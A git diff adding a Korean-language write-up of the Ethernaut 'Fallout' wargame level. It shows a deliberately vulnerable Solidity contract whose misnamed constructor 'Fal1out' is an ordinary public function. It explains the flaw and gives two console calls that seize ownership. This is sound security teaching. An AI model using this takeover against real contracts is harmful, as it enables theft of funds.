@@ -167,7 +167,7 @@ await contract.withdraw()
 
 ### 문제 요약
 
-작성 예정.
+컨트랙트의 소유권을 획득하면 클리어된다. 핵심은 생성자로 보여야 하는 함수가 실제로는 일반 public 함수라는 점이다.
 
 ### 핵심
 
@@ -175,19 +175,73 @@ await contract.withdraw()
 - 과거 Solidity 문법
 - 접근 제어 실수
 
+### 소스 코드
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Fallout {
+    mapping(address => uint256) allocations;
+    address payable public owner;
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "caller is not the owner");
+        _;
+    }
+
+    function Fal1out() public payable {
+        owner = msg.sender;
+        allocations[owner] = msg.value;
+    }
+
+    function allocate() public payable {
+        allocations[msg.sender] += msg.value;
+    }
+
+    function sendAllocation(address payable allocator) public {
+        require(allocations[allocator] > 0);
+        allocator.transfer(allocations[allocator]);
+    }
+
+    function collectAllocations() public onlyOwner {
+        msg.sender.transfer(address(this).balance);
+    }
+
+    function allocatorBalance(address allocator) public view returns (uint256) {
+        return allocations[allocator];
+    }
+}
+```
+
 ### 풀이
 
-작성 예정.
+Solidity 0.4.22 이전에는 `constructor` 키워드가 아니라 컨트랙트 이름과 같은 함수가 생성자였다.
+
+이 컨트랙트 이름은 `Fallout`인데 함수 이름은 `Fal1out`이다. 알파벳 `l`이 아니라 숫자 `1`이 들어가 있다.
+
+```solidity
+function Fal1out() public payable {
+    owner = msg.sender;
+    allocations[owner] = msg.value;
+}
+```
+
+그래서 이 함수는 배포 시 한 번만 실행되는 생성자가 아니다. 누구나 호출할 수 있는 public 함수다. 호출하면 `owner`가 `msg.sender`로 바뀐다.
 
 ### 공격 코드
 
 ```javascript
-// 작성 예정
+await contract.Fal1out()
+await contract.owner()
 ```
+
+- `Fal1out()`: 일반 public 함수라서 직접 호출 가능하다. 호출자의 주소가 `owner`가 된다.
+- `owner()`: 소유권이 내 주소로 바뀌었는지 확인한다.
 
 ### 정리
 
-작성 예정.
+생성자 이름을 잘못 쓰면 초기화 함수가 외부에 열린다. 과거 Solidity 코드에서는 컨트랙트 이름과 생성자 함수명이 정확히 일치하는지 확인해야 한다.
 
 </section>
 <section class="ethernaut-page" data-ethernaut-page data-level-title="Coin Flip" markdown="1">
